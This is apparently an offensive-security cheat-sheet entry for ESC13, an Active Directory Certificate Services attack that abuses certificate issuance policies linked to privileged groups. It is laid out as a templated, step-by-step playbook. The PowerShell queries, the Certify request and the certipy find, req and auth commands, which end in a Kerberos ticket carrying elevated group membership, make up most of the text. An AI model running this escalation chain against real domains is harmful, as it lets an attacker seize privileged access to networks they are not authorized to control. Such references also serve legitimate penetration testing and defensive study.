---
technique: ESC13 - OID Group Link
category: adcs
targets: Certificate Authority, Certificate Templates, Domain Principals
protocols: LDAP, RPC, HTTP, Kerberos
remote_capable: true
tags: adcs esc esc13 certificate-services pkinit
---

# ESC13 - OID Group Link

ESC13 abuses issuance policies linked to privileged groups through msDS-OIDToGroupLink.

## Windows

### ESC13: Step 1: verify OID group link (AD module)

#powershell #rsat #issuance-policy #group-link

Verify that the template's issuance policy has an OID group link to a privileged group.

```powershell title:"ESC13: check msPKI-Certificate-Policy on template"
Get-ADObject "CN=$template_name,$template_container" -Properties msPKI-Certificate-Policy
```
<!-- cheat
import domain_ip
import users
var template_name
var template_container
-->

### ESC13: Step 2: confirm msDS-OIDToGroupLink (AD module)

#powershell #rsat #issuance-policy #group-link

Confirm the OID policy object has a group link that grants elevated privileges on enrollment.

```powershell title:"ESC13: check msDS-OIDToGroupLink on policy OID object"
Get-ADObject "CN=$policy_id,$oid_container" -Properties DisplayName,msPKI-Cert-Template-OID,msDS-OIDToGroupLink
```
<!-- cheat
import domain_ip
import users
var policy_id
var oid_container
-->

### ESC13: Step 3: enroll on policy-linked template (Certify)

#powershell #certify #issuance-policy #group-link

Enroll on the template; the issued cert grants the linked group's privileges during PKINIT.

```powershell title:"ESC13: enroll on OID-group-linked template for elevated token"
.\Certify.exe request /ca:"$domain\$ca_name" /template:"$template_name"
```
<!-- cheat
import domain_ip
import users
var ca_name
var template_name
-->

## Linux

### ESC13: Step 1: enumerate vulnerable templates (certipy)

#certipy #issuance-policy #group-link #enum

Enumerate templates to find those with OID group links to privileged groups.

```sh title:"ESC13: find vulnerable templates with certipy"
certipy find -u $user@$domain $auth_flags -dc-ip $rhost_ip -vulnerable -enabled -text
```
<!-- cheat
import domain_ip
import users
import certipy_auth
-->

### ESC13: Step 2: enroll on policy-linked template (certipy)

#certipy #issuance-policy #group-link

Enroll on the template whose issuance policy is linked to a privileged group.

```sh title:"ESC13: request cert from OID-group-linked template"
certipy req -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -template $template_name
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
var template_name
-->

### ESC13: Step 3: PKINIT for elevated group token (certipy)

#certipy #pkinit

Authenticate with PKINIT; the resulting TGT carries the linked privileged group's membership.

```sh title:"ESC13: PKINIT with policy-linked cert for elevated token"
certipy auth -pfx $user.pfx -username $user@$domain -dc-ip $rhost_ip
```
<!-- cheat
import domain_ip
import users
import certipy_auth
-->
